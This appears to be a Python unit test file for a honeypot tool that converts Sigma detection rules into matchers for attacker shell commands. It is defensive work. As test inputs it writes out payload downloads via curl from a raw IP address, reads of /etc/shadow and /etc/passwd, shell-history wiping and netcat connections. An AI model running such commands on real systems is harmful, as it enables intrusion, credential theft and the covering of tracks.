from __future__ import annotations

import os
from pathlib import Path

import pytest

from services.cowrie.sigma_mapping import SigmaCowrieCommandRuleCatalog, import_sigma_command_rules


pytestmark = pytest.mark.unit


def test_sigma_command_rule_catalog_reads_sigma_yaml_at_runtime() -> None:
    result = import_sigma_command_rules(Path("tests/fixtures/sigma"))
    catalog = SigmaCowrieCommandRuleCatalog("tests/fixtures/sigma")

    download_rules = catalog.match("curl http://146.169.44.23:18085/downloads/agent-update.bin")
    chmod_rules = catalog.match("chmod +x agent-update.bin")

    assert result.files_read == 2
    assert result.files_with_rules == 2
    assert [rule.technique_id for rule in download_rules] == ["T1105"]
    assert download_rules[0].confidence == "high"
    assert download_rules[0].source_refs[0].type == "sigma_rule"
    assert [rule.technique_id for rule in chmod_rules] == ["T1059"]
    assert chmod_rules[0].confidence == "medium"


def test_sigma_command_rule_catalog_reads_multiple_configured_roots(tmp_path: Path) -> None:
    first = tmp_path / "first"
    second = tmp_path / "second"
    first.mkdir()
    second.mkdir()
    (first / "whoami.yml").write_text(
        """
title: Compatible Whoami
detection:
  selection:
    CommandLine|contains: whoami
  condition: selection
tags:
  - attack.t1033
level: high
""",
        encoding="utf-8",
    )
    (second / "shadow.yml").write_text(
        """
title: Shadow Access
detection:
  selection:
    CommandLine|contains: /etc/shadow
  condition: selection
tags:
  - attack.t1003
level: high
""",
        encoding="utf-8",
    )
    catalog = SigmaCowrieCommandRuleCatalog(
        os.pathsep.join([str(first), str(tmp_path / "missing"), str(second)])
    )

    assert [rule.technique_id for rule in catalog.match("whoami")] == ["T1033"]
    assert [rule.technique_id for rule in catalog.match("cat /etc/shadow")] == ["T1003"]


def test_import_sigma_command_rules_ignores_rules_without_attack_tags(tmp_path: Path) -> None:
    sigma_file = tmp_path / "no_attack_tag.yml"
    sigma_file.write_text(
        """
title: No ATTACK Tag
detection:
  selection:
    CommandLine|contains: secret
  condition: selection
tags:
  - test.local
level: high
""",
        encoding="utf-8",
    )

    result = import_sigma_command_rules(tmp_path)

    assert result.files_read == 1
    assert result.files_with_rules == 0
    assert result.rules == []


def test_import_sigma_command_rules_uses_compatible_rules_from_the_configured_folder(
    tmp_path: Path,
) -> None:
    sigma_file = tmp_path / "compatible_rule.yml"
    sigma_file.write_text(
        """
title: Compatible Whoami
logsource:
  product: custom
  category: process_creation
detection:
  selection:
    CommandLine|contains: whoami
  condition: selection
tags:
  - attack.t1033
level: high
""",
        encoding="utf-8",
    )

    result = import_sigma_command_rules(tmp_path)

    assert result.files_with_rules == 1
    assert [rule["technique_id"] for rule in result.rules] == ["T1033"]


def test_import_sigma_command_rules_ignores_unsupported_fields(tmp_path: Path) -> None:
    sigma_file = tmp_path / "unsupported_field_rule.yml"
    sigma_file.write_text(
        """
title: Unsupported Field Event
logsource:
  product: linux
  category: file_event
detection:
  selection:
    TargetFilename|contains: /tmp
  condition: selection
tags:
  - attack.t1105
level: medium
""",
        encoding="utf-8",
    )

    result = import_sigma_command_rules(tmp_path)

    assert result.files_with_rules == 0
    assert result.rules == []


def test_import_sigma_command_rules_converts_auditd_execve_args(tmp_path: Path) -> None:
    sigma_file = tmp_path / "auditd_execve.yml"
    sigma_file.write_text(
        """
title: Auditd Execve Chmod
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: EXECVE
    a0: chmod
    a1: 777
  condition: selection
tags:
  - attack.t1059.004
level: medium
""",
        encoding="utf-8",
    )
    catalog = SigmaCowrieCommandRuleCatalog(tmp_path)

    rules = catalog.match("chmod 777 /tmp/agent")

    assert [rule.technique_id for rule in rules] == ["T1059.004"]


def test_import_sigma_command_rules_converts_builtin_keywords(tmp_path: Path) -> None:
    sigma_file = tmp_path / "builtin_keywords.yml"
    sigma_file.write_text(
        """
title: Shell History Clear
logsource:
  product: linux
detection:
  keywords:
    - history -c
    - rm *sh_history
  condition: keywords
tags:
  - attack.t1070.003
level: high
""",
        encoding="utf-8",
    )
    catalog = SigmaCowrieCommandRuleCatalog(tmp_path)

    history_rules = catalog.match("history -c")
    rm_rules = catalog.match("rm ~/.bash_history")

    assert [rule.technique_id for rule in history_rules] == ["T1070.003"]
    assert [rule.technique_id for rule in rm_rules] == ["T1070.003"]


def test_import_sigma_command_rules_ignores_partial_context_matches(tmp_path: Path) -> None:
    sigma_file = tmp_path / "parent_context_rule.yml"
    sigma_file.write_text(
        """
title: Context Required
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    ParentImage|endswith: /java
    CommandLine|contains: whoami
  condition: selection
tags:
  - attack.t1033
level: high
""",
        encoding="utf-8",
    )

    result = import_sigma_command_rules(tmp_path)

    assert result.files_with_rules == 0
    assert result.rules == []


def test_import_sigma_command_rules_merges_all_of_selection_conditions(tmp_path: Path) -> None:
    sigma_file = tmp_path / "all_of_rule.yml"
    sigma_file.write_text(
        """
title: Multi Selection Rule
logsource:
  product: linux
  category: process_creation
detection:
  selection_file:
    CommandLine|contains: /etc/passwd
  selection_path:
    CommandLine|contains: /tmp
  condition: all of selection_*
tags:
  - attack.t1552.001
level: high
""",
        encoding="utf-8",
    )
    catalog = SigmaCowrieCommandRuleCatalog(tmp_path)

    matching_rules = catalog.match("cat /etc/passwd /tmp/copy")
    missing_path_rules = catalog.match("cat /etc/passwd")

    assert [rule.technique_id for rule in matching_rules] == ["T1552.001"]
    assert missing_path_rules == ()


def test_import_sigma_command_rules_merges_explicit_and_conditions(tmp_path: Path) -> None:
    sigma_file = tmp_path / "and_rule.yml"
    sigma_file.write_text(
        """
title: Curl HTTP Download
logsource:
  product: linux
  category: process_creation
detection:
  selection_process:
    Image|endswith: /curl
  selection_url:
    CommandLine|contains: http://
  condition: selection_process and selection_url
tags:
  - attack.t1105
level: high
""",
        encoding="utf-8",
    )
    catalog = SigmaCowrieCommandRuleCatalog(tmp_path)

    matching_rules = catalog.match("curl http://146.169.44.23/payload.sh")
    wrong_process_rules = catalog.match("wget http://146.169.44.23/payload.sh")
    missing_arg_rules = catalog.match("curl --help")

    assert [rule.technique_id for rule in matching_rules] == ["T1105"]
    assert wrong_process_rules == ()
    assert missing_arg_rules == ()


def test_import_sigma_command_rules_supports_not_filter_conditions(tmp_path: Path) -> None:
    sigma_file = tmp_path / "filter_rule.yml"
    sigma_file.write_text(
        """
title: Netcat Connect
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: /nc
  filter_listener:
    CommandLine|contains: " -l "
  condition: selection and not filter_listener
tags:
  - attack.t1046
level: medium
""",
        encoding="utf-8",
    )
    catalog = SigmaCowrieCommandRuleCatalog(tmp_path)

    connect_rules = catalog.match("nc 10.0.0.5 22")
    listener_rules = catalog.match("nc -l 4444")

    assert [rule.technique_id for rule in connect_rules] == ["T1046"]
    assert listener_rules == ()


def test_import_sigma_command_rules_keeps_process_name_only_rules(tmp_path: Path) -> None:
    sigma_file = tmp_path / "generic_process.yml"
    sigma_file.write_text(
        """
title: Generic Process Only
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: /whoami
  condition: selection
tags:
  - attack.t1033
level: medium
""",
        encoding="utf-8",
    )

    result = import_sigma_command_rules(tmp_path)

    assert result.files_with_rules == 1
    assert [rule["technique_id"] for rule in result.rules] == ["T1033"]


def test_import_sigma_command_rules_keeps_scanner_process_name_only_rules(tmp_path: Path) -> None:
    sigma_file = tmp_path / "scanner_process.yml"
    sigma_file.write_text(
        """
title: Scanner Process Only
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: /nmap
  condition: selection
tags:
  - attack.t1046
level: low
""",
        encoding="utf-8",
    )

    result = import_sigma_command_rules(tmp_path)

    assert result.files_with_rules == 1
    assert [rule["technique_id"] for rule in result.rules] == ["T1046"]


def test_import_sigma_command_rules_keeps_standalone_or_selection(tmp_path: Path) -> None:
    sigma_file = tmp_path / "or_rule.yml"
    sigma_file.write_text(
        """
title: Or Selection Rule
logsource:
  product: linux
  category: process_creation
detection:
  selection_netcat:
    Image|endswith: /nc
  selection_scanner:
    Image|endswith: /nmap
  filter_main:
    CommandLine|contains: " -l "
  condition: (selection_netcat and not filter_main) or selection_scanner
tags:
  - attack.t1046
level: low
""",
        encoding="utf-8",
    )

    result = import_sigma_command_rules(tmp_path)
    catalog = SigmaCowrieCommandRuleCatalog(tmp_path)

    assert result.files_with_rules == 1
    assert len(result.rules) == 2
    assert [rule.technique_id for rule in catalog.match("nc 10.0.0.5 22")] == ["T1046"]
    assert catalog.match("nc -l 4444") == ()
    assert [rule.technique_id for rule in catalog.match("nmap 10.0.0.5")] == ["T1046"]


def test_import_sigma_command_rules_expands_one_of_selection_patterns(tmp_path: Path) -> None:
    sigma_file = tmp_path / "one_of_rule.yml"
    sigma_file.write_text(
        """
title: Discovery Commands
logsource:
  product: linux
  category: process_creation
detection:
  selection_whoami:
    Image|endswith: /whoami
  selection_id:
    Image|endswith: /id
  condition: 1 of selection_*
tags:
  - attack.t1033
level: medium
""",
        encoding="utf-8",
    )
    catalog = SigmaCowrieCommandRuleCatalog(tmp_path)

    assert [rule.technique_id for rule in catalog.match("whoami")] == ["T1033"]
    assert [rule.technique_id for rule in catalog.match("id")] == ["T1033"]
    assert catalog.match("uname -a") == ()


def test_sigma_catalog_fails_clearly_when_rule_path_is_missing(tmp_path: Path) -> None:
    catalog = SigmaCowrieCommandRuleCatalog(tmp_path / "missing")

    with pytest.raises(FileNotFoundError, match="Sigma rule path does not exist"):
        catalog.match("id")


def test_import_sigma_command_rules_deduplicates_generated_rule_names(tmp_path: Path) -> None:
    rule = """
title: Duplicate Title
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains: curl
  condition: selection
tags:
  - attack.t1105
level: medium
"""
    (tmp_path / "first.yml").write_text(rule, encoding="utf-8")
    (tmp_path / "second.yml").write_text(rule, encoding="utf-8")

    result = import_sigma_command_rules(tmp_path)

    names = [str(item["name"]) for item in result.rules]
    assert len(names) == 2
    assert len(set(names)) == 2
